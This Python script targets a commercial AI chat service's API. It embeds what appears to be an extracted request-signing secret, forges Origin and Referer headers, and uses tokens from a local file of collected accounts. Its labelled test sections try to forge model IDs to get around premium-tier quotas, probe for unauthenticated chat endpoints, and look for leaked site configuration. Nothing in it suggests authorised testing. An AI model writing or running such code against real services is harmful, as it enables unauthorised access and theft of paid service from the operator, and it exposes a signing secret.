import requests
import json
import hashlib
import hmac
import uuid
import time
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

import os
os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
os.environ.pop('http_proxy', None)
os.environ.pop('https_proxy', None)

proxies = {"http": None, "https": None}

API_BASE = "https://api.877ai.cn/api"
SIGN_SECRET = "ukj3OXO_crBZoBmMeYDUw_gLqL9BqgbgY27XXPzJqTiWf1cToYLAPtPQRfpzypBa"

def gen_sig(method, url, body, ts, nonce):
    path = urlparse(url).path if url.startswith("http") else url
    body_hash = hashlib.sha256(body.encode() if body else b"").hexdigest()
    sign_str = f"{method.upper()}\n{path}\n{ts}\n{nonce}\n{body_hash}"
    return hmac.new(SIGN_SECRET.encode(), sign_str.encode(), hashlib.sha256).hexdigest()

def mk_headers(method, url, body="", token=None):
    ts = str(int(time.time() * 1000))
    nonce = str(uuid.uuid4())
    h = {
        "User-Agent": "Mozilla/5.0",
        "Origin": "https://kulaai.cn",
        "Referer": "https://kulaai.cn/",
        "Content-Type": "application/json",
        "X-Timestamp": ts,
        "X-Nonce": nonce,
        "X-Signature": gen_sig(method, url, body, ts, nonce),
    }
    if token:
        h["Authorization"] = f"Bearer {token}"
    return h

with open(r"e:\BaiduNetdiskDownload\1\kulaai_accounts.json", "r", encoding="utf-8") as f:
    accounts = json.load(f)

token = accounts[0]["token"]

print("=" * 70)
print("Premium模型限制深入分析")
print("=" * 70)

# 获取配额
quota_url = f"{API_BASE}/subscription/quota"
headers = mk_headers("GET", quota_url, "", token)
r = requests.get(quota_url, headers=headers, timeout=15, proxies=proxies, verify=False)
quota = r.json()
print(f"\n配额信息:")
print(f"  套餐: {quota.get('plan', {}).get('name')}")
print(f"  普通模型: {quota.get('normalModel', {}).get('used')}/{quota.get('normalModel', {}).get('quota')} ({quota.get('normalModel', {}).get('period')})")
print(f"  高级模型: {quota.get('premiumModel', {}).get('used')}/{quota.get('premiumModel', {}).get('quota')} ({quota.get('premiumModel', {}).get('period')})")
print(f"  积分: {quota.get('credits', {}).get('remaining')}")

# 获取模型列表
models_url = f"{API_BASE}/chat/display-models?capability=chat"
headers = mk_headers("GET", models_url, "", token)
r = requests.get(models_url, headers=headers, timeout=15, proxies=proxies, verify=False)
all_models = r.json()

# 找一个tier=normal的模型和tier=premium的模型
normal_models = [m for m in all_models if m.get('tier') in ['normal', 'free', None]]
premium_models = [m for m in all_models if m.get('tier') == 'premium']

print(f"\n模型分类:")
print(f"  Normal/Free: {len(normal_models)}")
print(f"  Premium: {len(premium_models)}")

# 看看所有tier值
tiers = set(m.get('tier', 'None') for m in all_models)
print(f"  所有tier值: {tiers}")

# 测试用免费配额的模型
print(f"\n测试聊天（使用第一个模型）:")
test_model = all_models[0]
print(f"  模型: {test_model['name']}, tier: {test_model.get('tier')}")

url = f"{API_BASE}/chat/stream"
body = json.dumps({
    "model": test_model.get('brand', 'chatgpt'),
    "displayModelId": test_model['id'],
    "messages": [{"role": "user", "content": "1+1=?"}],
    "stream": True
})
headers = mk_headers("POST", url, body, token)

r = requests.post(url, data=body, headers=headers, timeout=30, stream=True, proxies=proxies, verify=False)
print(f"  状态码: {r.status_code}")
full_text = ""
for line in r.iter_lines():
    if line:
        s = line.decode('utf-8', errors='ignore')
        if s.startswith('data: '):
            d = s[6:]
            if d == '[DONE]': break
            try:
                j = json.loads(d)
                if j.get('done'): break
                if j.get('error'):
                    print(f"  错误: {j['error']}")
                    break
                if j.get('content'):
                    full_text += j['content']
            except: pass
print(f"  回复: {full_text[:100]}")

# 再查看配额
headers = mk_headers("GET", quota_url, "", token)
r = requests.get(quota_url, headers=headers, timeout=15, proxies=proxies, verify=False)
quota2 = r.json()
print(f"\n聊天后配额:")
print(f"  普通模型: {quota2.get('normalModel', {}).get('used')}/{quota2.get('normalModel', {}).get('quota')}")
print(f"  高级模型: {quota2.get('premiumModel', {}).get('used')}/{quota2.get('premiumModel', {}).get('quota')}")

# 测试Premium模型（等待几秒避免重复请求限制）
print(f"\n等待5秒后测试Premium模型...")
time.sleep(5)

test_premium = premium_models[0]
print(f"  模型: {test_premium['name']}, tier: {test_premium.get('tier')}")

body = json.dumps({
    "model": test_premium.get('brand', 'chatgpt'),
    "displayModelId": test_premium['id'],
    "messages": [{"role": "user", "content": "1+1=?"}],
    "stream": True
})
headers = mk_headers("POST", url, body, token)

r = requests.post(url, data=body, headers=headers, timeout=30, stream=True, proxies=proxies, verify=False)
print(f"  状态码: {r.status_code}")
full_text = ""
error_msg = ""
for line in r.iter_lines():
    if line:
        s = line.decode('utf-8', errors='ignore')
        if s.startswith('data: '):
            d = s[6:]
            if d == '[DONE]': break
            try:
                j = json.loads(d)
                if j.get('done'): break
                if j.get('error'):
                    error_msg = j['error']
                    break
                if j.get('content'):
                    full_text += j['content']
            except: pass
if error_msg:
    print(f"  错误: {error_msg}")
elif full_text:
    print(f"  ✅ 成功! 回复: {full_text[:100]}")
else:
    # 非流式读取
    r2 = requests.post(url, data=body, headers=headers, timeout=30, proxies=proxies, verify=False)
    print(f"  响应: {r2.text[:200]}")

# 再查看配额
headers = mk_headers("GET", quota_url, "", token)
r = requests.get(quota_url, headers=headers, timeout=15, proxies=proxies, verify=False)
quota3 = r.json()
print(f"\nPremium请求后配额:")
print(f"  普通模型: {quota3.get('normalModel', {}).get('used')}/{quota3.get('normalModel', {}).get('quota')}")
print(f"  高级模型: {quota3.get('premiumModel', {}).get('used')}/{quota3.get('premiumModel', {}).get('quota')}")

# 测试：是否可以通过修改displayModelId来绕过tier限制
print(f"\n" + "=" * 70)
print("测试: 伪造displayModelId绕过tier限制")
print("=" * 70)

# 用一个已知能用的displayModelId，但修改请求中的model字段
# 实际上displayModelId是服务端校验的，我们看看能不能用normal模型的id访问premium模型
print(f"\n  策略1: 使用normal模型ID但请求中model字段改为premium模型名")

# 找一个normal tier的模型
normal_model = None
for m in all_models:
    if m.get('tier') != 'premium':
        normal_model = m
        break

if normal_model:
    print(f"  Normal模型: {normal_model['name']} (tier={normal_model.get('tier')})")
    print(f"  Premium模型: {test_premium['name']} (tier={test_premium.get('tier')})")
    
    # 用normal的displayModelId，但model字段写premium的名称
    body = json.dumps({
        "model": test_premium.get('brand', 'chatgpt'),
        "displayModelId": normal_model['id'],  # 使用normal模型的ID
        "messages": [{"role": "user", "content": "你好"}],
        "stream": True
    })
    headers = mk_headers("POST", url, body, token)
    
    time.sleep(3)
    r = requests.post(url, data=body, headers=headers, timeout=30, stream=True, proxies=proxies, verify=False)
    print(f"  状态码: {r.status_code}")
    full_text = ""
    for line in r.iter_lines():
        if line:
            s = line.decode('utf-8', errors='ignore')
            if s.startswith('data: '):
                d = s[6:]
                if d == '[DONE]': break
                try:
                    j = json.loads(d)
                    if j.get('done'): break
                    if j.get('error'):
                        print(f"  错误: {j['error']}")
                        break
                    if j.get('content'):
                        full_text += j['content']
                except: pass
    if full_text:
        print(f"  ✅ 回复: {full_text[:100]}")

# 测试：直接传入模型名而不是displayModelId
print(f"\n  策略2: 不传displayModelId，仅用model名")
time.sleep(3)
body = json.dumps({
    "model": "chatgpt",
    "subModel": "gpt-5.5",  # premium模型名
    "messages": [{"role": "user", "content": "hi"}],
    "stream": True
})
headers = mk_headers("POST", url, body, token)
r = requests.post(url, data=body, headers=headers, timeout=15, proxies=proxies, verify=False)
print(f"  状态码: {r.status_code}")
print(f"  响应: {r.text[:200]}")

# 测试: 检查是否有其他不需要认证的聊天端点
print(f"\n" + "=" * 70)
print("测试: 其他聊天端点")
print("=" * 70)

alt_endpoints = [
    "/chat/completions",
    "/chat/message",
    "/chat/send",
    "/v1/chat/completions",
    "/openai/v1/chat/completions",
    "/chat/free",
    "/chat/demo",
    "/chat/try",
]

for ep in alt_endpoints:
    full_url = f"{API_BASE}{ep}"
    body = json.dumps({"model": "chatgpt", "messages": [{"role": "user", "content": "hi"}], "stream": False})
    headers = mk_headers("POST", full_url, body)
    try:
        r = requests.post(full_url, data=body, headers=headers, timeout=8, proxies=proxies, verify=False)
        if r.status_code != 404:
            print(f"  [{r.status_code}] {ep}: {r.text[:100]}")
    except:
        pass

# 测试: 检查site-config是否泄露敏感信息
print(f"\n" + "=" * 70)
print("测试: 站点配置信息泄露")
print("=" * 70)

config_url = f"{API_BASE}/auth/site-config"
headers = mk_headers("GET", config_url, "")
r = requests.get(config_url, headers=headers, timeout=10, proxies=proxies, verify=False)
print(f"  站点配置: {r.text[:500]}")

# 检查订阅计划是否泄露内部信息
plans_url = f"{API_BASE}/subscription/plans"
headers = mk_headers("GET", plans_url, "")
r = requests.get(plans_url, headers=headers, timeout=10, proxies=proxies, verify=False)
plans = r.json()
print(f"\n  订阅计划数: {len(plans)}")
for p in plans[:3]:
    print(f"  - {p.get('name')}: {json.dumps(p, ensure_ascii=False)[:200]}")
